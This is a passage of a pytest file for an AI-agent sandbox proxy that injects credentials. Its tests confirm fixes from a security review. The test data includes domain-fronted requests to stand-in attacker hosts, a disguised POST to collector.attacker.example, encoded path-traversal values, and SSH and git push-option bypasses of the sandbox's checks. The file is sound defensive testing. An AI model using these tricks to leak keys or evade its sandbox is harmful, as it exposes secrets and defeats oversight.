    body = b"%04x" % (len(line) + 4) + line + b"0000"

    def check():
        return proxy.server.check_push("http://example.test/repo.git/git-receive-pack", [], [(body, body)], [], set())[0]
    try:
        started = time.monotonic()
        verdict = check()
        assert not verdict["ok"] and "did not answer within" in verdict["message"], verdict
        assert time.monotonic() - started < 1.5
        started = time.monotonic()
        verdict = check()
        assert not verdict["ok"] and "still busy" in verdict["message"] and time.monotonic() - started < 1, verdict
        time.sleep(2.5)  # the checker caught up
        verdict = check()
        assert verdict["ok"] and verdict["message"] == "answer 1", verdict
    finally:
        proxy.close()
        checker.stdin.close()
        checker.wait(5)


def test_the_proxys_caches_stay_bounded(monkeypatch, tmp_path):
    """Names under an allowed wildcard are endless: the TLS contexts (a certificate each in OpenSSL's memory) and
    the server checks the proxy keeps are capped, the most recently used kept."""
    import threading as threads
    server = rt.ProxyServer.__new__(rt.ProxyServer)
    server.lock, server.contexts, server.verified, server.run_dir = threads.Lock(), {}, {}, tmp_path
    made = []

    class Context:
        def __init__(self, protocol):
            made.append(self)

        def set_alpn_protocols(self, protocols):
            pass

        def load_cert_chain(self, certificate, key):
            pass
    monkeypatch.setattr(rt.ssl, "SSLContext", Context)
    monkeypatch.setattr(rt, "server_certificate", lambda run_dir, host: tmp_path / f"{host}.pem")
    monkeypatch.setattr(rt, "PROXY_CONTEXTS", 4)
    first = server.server_context("h0.example.org")
    for i in range(1, 6):
        server.server_context(f"h{i}.example.org")
        assert server.server_context("h0.example.org") is first  # in use: kept
    assert len(server.contexts) == 4 and "h1.example.org" not in server.contexts and len(made) == 6
    # serves_name: expired answers go first, then the oldest; never more than PROXY_VERIFIED.
    monkeypatch.setattr(rt, "PROXY_VERIFIED", 3)

    class Upstream:
        def wrap_socket(self, raw, server_hostname):
            return contextlib.nullcontext()
    server.upstream = Upstream()
    monkeypatch.setattr(rt.socket, "create_connection", lambda *a, **kw: contextlib.nullcontext())
    server.verified = {("1.1.1.1", 443, "old"): rt.time.monotonic() - 1}
    for name in ("a", "b", "c", "d"):
        assert server.serves_name("1.1.1.1", 443, name)
    assert len(server.verified) <= 3 and ("1.1.1.1", 443, "old") not in server.verified
    assert ("1.1.1.1", 443, "d") in server.verified


# --- review 5: a credential goes only with a Host naming its server (domain fronting) ----------------------


def exchange_once(server, request, origin, scheme="https", destination="203.0.113.10:443"):
    """ProxyServer.exchange over socket pairs: (bytes that reached the upstream server, the agent's answer)."""
    agent_side, proxy_client = socket.socketpair()
    proxy_upstream, server_side = socket.socketpair()
    got = bytearray()

    def upstream():
        server_side.settimeout(3)
        with contextlib.suppress(OSError):
            while b"\r\n\r\n" not in got:
                data = server_side.recv(65536)
                if not data:
                    return
                got.extend(data)
            server_side.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nok")
    thread = threading.Thread(target=upstream)
    thread.start()
    agent_side.sendall(request)
    agent_side.shutdown(socket.SHUT_WR)
    server.exchange(rt.Stream(proxy_client), proxy_client, proxy_upstream, scheme, origin,
                    {"connection": 1, "destination": destination})
    thread.join(3)
    agent_side.settimeout(1)
    try:
        answer = agent_side.recv(65536)
    except OSError:
        answer = b""
    for sock in (agent_side, proxy_client, proxy_upstream, server_side):
        sock.close()
    return bytes(got), answer


FRONTED = {"api_keys": [{"host": "myendpoint.hf.space", "port": 443, "name": "HF_TOKEN",
                         "placeholder": "sandbox-ai-api-key-placeholder-HF_TOKEN", "key": "sk-REAL-SECRET-0123456789"}],
           "llm": [{"name": "myllm", "scheme": "https", "host": "myllm.hf.space", "port": 443, "prefix": "",
                    "placeholder": "sandbox-ai-llm-key-placeholder", "key": "LLM-REAL-KEY-zzzzzzzz", "headers": [],
                    "addresses": []},
                   {"name": "lan", "scheme": "http", "host": "gpu.lan", "port": 11434, "prefix": "",
                    "placeholder": "sandbox-ai-llm-key-placeholder", "key": "LAN-REAL-KEY-yyyyyyyy", "headers": [],
                    "addresses": ["10.0.0.5"]}],
           "git_tokens": [{"host": "github.com", "port": 443, "user": "x-access-token",
                           "token": "tok-FRONTED-REAL-0123456789"},
                          {"host": "localhost", "port": 3080, "user": "ch", "token": "tok-LOOP-42", "loopback": True}]}


def fronting_server(tmp_path, config=FRONTED, **kw):
    fd = os.open(tmp_path / "log.jsonl", os.O_WRONLY | os.O_CREAT | os.O_APPEND, 0o600)
    return rt.ProxyServer({"body_limit": 65536, **config}, fd, run_dir=tmp_path, **kw), tmp_path / "log.jsonl"


@pytest.mark.parametrize("request_, origin", [
    (b"GET /whoami HTTP/1.1\r\nHost: attacker.hf.space\r\nAuthorization: Bearer "
     b"sandbox-ai-api-key-placeholder-HF_TOKEN\r\n\r\n", "myendpoint.hf.space"),
    (b"POST /v1/messages HTTP/1.1\r\nHost: attacker.hf.space\r\nContent-Length: 0\r\n\r\n", "myllm.hf.space"),
    (b"GET /a/x.git/info/refs?service=git-upload-pack HTTP/1.1\r\nHost: evil.example\r\n\r\n", "github.com"),
    (b"GET /whoami HTTP/1.1\r\nHost: myendpoint.hf.space:8443\r\nAuthorization: Bearer "
     b"sandbox-ai-api-key-placeholder-HF_TOKEN\r\n\r\n", "myendpoint.hf.space"),
    (b"GET /whoami HTTP/1.0\r\nAuthorization: Bearer sandbox-ai-api-key-placeholder-HF_TOKEN\r\n\r\n",
     "myendpoint.hf.space"),
], ids=["api-key", "llm-without-placeholder", "git-token", "another-port", "no-host"])
def test_a_credential_never_goes_with_a_host_naming_another_server(tmp_path, request_, origin):
    """Review 5 H1 (PoC poc1_fronting.py): front ends route by Host, and one certificate serves many tenants; the
    proxy added --api-key, --llm and Git login credentials by the TLS name alone. Now refused with a 403 that says
    why, logged, and nothing reaches the server."""
    server, log = fronting_server(tmp_path)
    upstream, answer = exchange_once(server, request_, origin)
    assert upstream == b""
    assert answer.startswith(b"HTTP/1.1 403") and b"sandbox-ai: " in answer and b"the credential is for" in answer \
        or b"no single Host" in answer
    text = log.read_text()
    assert '"event": "denied"' in text and "REAL" not in text


@pytest.mark.parametrize("host", [b"MyEndpoint.HF.Space.", b"myendpoint.hf.space:443", b"myendpoint.hf.space"])
def test_a_credential_goes_with_its_own_host_in_any_spelling(tmp_path, host):
    server, _ = fronting_server(tmp_path)
    upstream, answer = exchange_once(server, b"GET /whoami HTTP/1.1\r\nHost: " + host + b"\r\nAuthorization: Bearer "
                                     b"sandbox-ai-api-key-placeholder-HF_TOKEN\r\n\r\n", "myendpoint.hf.space")
    assert b"Bearer sk-REAL-SECRET-0123456789" in upstream and answer.startswith(b"HTTP/1.1 200")


def test_without_a_credential_another_host_is_left_to_the_rules(tmp_path):
    """Nothing added: the request goes on as before (the placeholder stays a placeholder)."""
    server, _ = fronting_server(tmp_path)
    upstream, _ = exchange_once(server, b"GET /x HTTP/1.1\r\nHost: attacker.hf.space\r\nAuthorization: Bearer "
                                b"agents-own\r\n\r\n", "myendpoint.hf.space")
    assert b"Bearer agents-own" in upstream


def test_plain_http_credentials_need_the_endpoints_name_address_or_the_loopback(tmp_path):
    """Plain http: an --llm endpoint's key with its name or pinned address; a loopback Git login with a loopback
    name; any other Host is refused."""
    server, _ = fronting_server(tmp_path)
    for host, sent in ((b"gpu.lan:11434", True), (b"10.0.0.5:11434", True), (b"other.lan:11434", False)):
        upstream, answer = exchange_once(server, b"POST /v1/x HTTP/1.1\r\nHost: " + host + b"\r\nContent-Length: 0\r\n"
                                         b"\r\n", "10.0.0.5:11434", scheme="http", destination="10.0.0.5:11434")
        assert (b"LAN-REAL-KEY" in upstream) == sent and answer.startswith(b"HTTP/1.1 200" if sent else b"HTTP/1.1 403")
    git = b"GET /o/r.git/info/refs?service=git-upload-pack HTTP/1.1\r\nHost: %s\r\n\r\n"
    for host, sent in ((b"localhost:3080", True), (b"127.0.0.1:3080", True), (b"git.evil.example:3080", False)):
        upstream, _ = exchange_once(server, git % host, "127.0.0.1:3080", scheme="http", destination="127.0.0.1:3080")
        assert (b"Authorization: Basic" in upstream) == sent


def test_a_question_names_the_verified_server_and_the_host_header_as_a_claim(tmp_path):
    """Review 5 M1 (PoC poc2_approval_host.py): in mode high a POST to an attacker's server, with Host:
    api.github.com, was asked about as a write to api.github.com. The question and the log now name the server the
    proxy verified; the Host header is shown as an unverified claim."""
    spec = importlib.util.spec_from_file_location("approvals_for_proxy", ROOT / "sandbox/approvals.py")
    approvals = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(approvals)
    rules = [{"name": "security mode high", "version": 1, "http": [
        {"id": "mode-writes", "host": "*", "methods": ["POST"], "decision": "ask", "reason": "a write"}]}]
    asked = []
    server, log = fronting_server(tmp_path, {"rules": rules},
                                  asker=lambda kind, details: asked.append((kind, details)) or
                                  {"decision": "deny", "scope": "once"})
    exchange_once(server, b"POST /repos/me/project/issues HTTP/1.1\r\nHost: api.github.com\r\nContent-Length: 2\r\n"
                  b"\r\n{}", "collector.attacker.example", destination="198.51.100.7:443")
    kind, details = asked[0]
    assert details["host"] == "collector.attacker.example" and details["host_header"] == "api.github.com"
    assert details["url"] == "https://collector.attacker.example/repos/me/project/issues"
    text = approvals.describe({"kind": kind, **details})
    assert "POST https://collector.attacker.example/" in text and "api.github.com (not verified)" in text
    record = json.loads(log.read_text().splitlines()[-1])
    assert record["url"].startswith("https://collector.attacker.example/") and record["host_header"] == "api.github.com"


# --- review 5 lows: paths that read differently, SSH after a junk line, push options -------------------------


@pytest.mark.parametrize("target, sent", [
    ("/tenantA/v1/chat/completions", True),
    ("/tenantB/v1/chat/completions", False),
    ("/tenantB/x%2F..%2F..%2FtenantA/v1/chat/completions", False),
    ("/tenantB/x\\..\\..\\tenantA/v1/chat/completions", False),
    ("/tenantA/v1/x/../chat", False),
])
def test_a_path_servers_read_differently_gets_no_key_below_a_prefix(tmp_path, target, sent):
    """Review 5 L1 (PoC poc4_grant_normalization.py): the prefix grant of --llm went by the normalised path, so
    /tenantB/x%2F..%2F..%2FtenantA/... got tenant A's key while a raw-routing server served tenant B."""
    entry = {"name": "gw", "scheme": "https", "host": "gateway.example.net", "port": 443, "prefix": "/tenantA/v1",
             "placeholder": "PH", "key": "TENANT-A-REAL-KEY", "headers": [], "addresses": []}
    server, _ = fronting_server(tmp_path, {"llm": [entry]})
    upstream, _ = exchange_once(server, f"POST {target} HTTP/1.1\r\nHost: gateway.example.net\r\nContent-Length: "
                                "0\r\n\r\n".encode(), "gateway.example.net")
    assert (b"TENANT-A-REAL-KEY" in upstream) == sent


def test_an_allow_rule_for_some_paths_never_allows_a_path_read_differently():
    """Review 5 L1: an allow-list (--allow-http HOST GET /public/**) let /private/x%2F..%2F..%2Fpublic/y through;
    an encoded slash alone (GitLab's group%2Fproject) is no ambiguity."""
    rules = rt.Ruleset([{"name": "--allow-http", "version": 1, "http": [
        {"id": "a1", "host": "api.example.net", "methods": ["GET"], "path": "/public/**", "decision": "allow"}]}])
    decide = lambda target: rules.http(rt.Ruleset.request("api.example.net", "GET", target,  # noqa: E731
                                                          [["Host", "api.example.net"]]))["decision"]
    assert decide("/public/a") == "allow" and decide("/private/report") == "deny"
    assert decide("/private/x%2F..%2F..%2Fpublic/y") == "deny" and decide("/public/../public/a") == "deny"
    assert decide("/public/group%2Fproject") == "allow"
    assert not rt.ambiguous_path("/api/v4/projects/group%2Fproject") and rt.ambiguous_path("/a/%252e%252e/b")


def test_ssh_after_a_junk_line_is_refused_too(tmp_path):
    """Review 5 L2 (PoC poc3_ssh_prefix.py): a client that sent "x\\r\\n" before its SSH banner was relayed as plain
    TCP to a public Git host (Go's x/crypto/ssh servers skip such lines). Any early line counts, and the server's
    banner too."""
    assert rt.ssh_banner(b"SSH-2.0-x\r\n") and rt.ssh_banner(b"x\r\nSSH-2.0-OpenSSH_9.6\r\n")
    assert not rt.ssh_banner(b"GET / HTTP/1.1\r\n") and not rt.ssh_banner(b"x" * 300 + b"\nSSH-2.0-late")
    listener = socket.socket()
    listener.bind(("127.0.0.1", 0))
    listener.listen(5)
    port = listener.getsockname()[1]
    received = []

    def sshd():  # speaks first, as SSH servers do
        with contextlib.suppress(OSError):
            conn, _ = listener.accept()
            conn.sendall(b"SSH-2.0-Go\r\n")
            conn.settimeout(2)
            data = b""
            with contextlib.suppress(OSError):
                while chunk := conn.recv(4096):
                    data += chunk
            received.append(data)
            conn.close()
    threading.Thread(target=sshd, daemon=True).start()
    server, log = fronting_server(tmp_path, {"allow": {"loopback": [port]},
                                             "ssh": {"block": True, "public_git": ["127.0.0.1"]}},
                                  destination=lambda sock: ("127.0.0.1", port))
    server.attribute = lambda record: None
    pair = socket.socket()
    pair.bind(("127.0.0.1", 0))
    pair.listen(1)
    client = socket.create_connection(pair.getsockname())
    redirected, _ = pair.accept()
    client.sendall(b"x\r\n")  # a junk line, its banner later
    thread = threading.Thread(target=server.handle, args=(redirected,))
    thread.start()
    thread.join(10)
    client.close()
    listener.close()
    assert not any(data for data in received)
    assert '"protocol": "ssh"' in log.read_text() and "public Git host" in log.read_text()


def test_push_options_go_to_the_privacy_check(tmp_path):
    """Review 5 L3 (PoC poc5_push_options.py): the options of git push -o (published by GitLab as merge request
    texts) were passed on unread; they go to the checker with the commands."""
    server, _ = fronting_server(tmp_path, {})
    seen = []
    server.checker = object()
    server.ask_checker = lambda request: (seen.append(request), {"ok": False, "message": "private"})[1]
    old, new = "0" * 40, "1" * 40
    body = (rt.pkt(f"{old} {new} refs/heads/feature\0report-status push-options\n".encode()) + b"0000"
            + rt.pkt(b"merge_request.create") + rt.pkt(b"merge_request.description=PRIVATE") + b"0000"
            + b"PACK\x00\x00\x00\x02")
    request = (b"POST /a/public.git/git-receive-pack HTTP/1.1\r\nHost: gitlab.com\r\nContent-Type: "
               b"application/x-git-receive-pack-request\r\nContent-Length: %d\r\n\r\n" % len(body)) + body
    upstream, answer = exchange_once(server, request, "gitlab.com")
    assert seen[0]["push_options"] == ["merge_request.create", "merge_request.description=PRIVATE"]
    assert b"merge_request.description" not in upstream and b"refused by the sandbox-ai privacy check" in answer
    # an options list that never ends cannot be checked: refused
    seen.clear()
    cut = body.split(b"PACK")[0][:-4]
    upstream, answer = exchange_once(server, (b"POST /a/public.git/git-receive-pack HTTP/1.1\r\nHost: gitlab.com\r\n"
                                              b"Content-Length: %d\r\n\r\n" % len(cut)) + cut, "gitlab.com")
    assert seen == [] and upstream == b"" and answer.startswith(b"HTTP/1.1 200")  # refused, nothing passed on
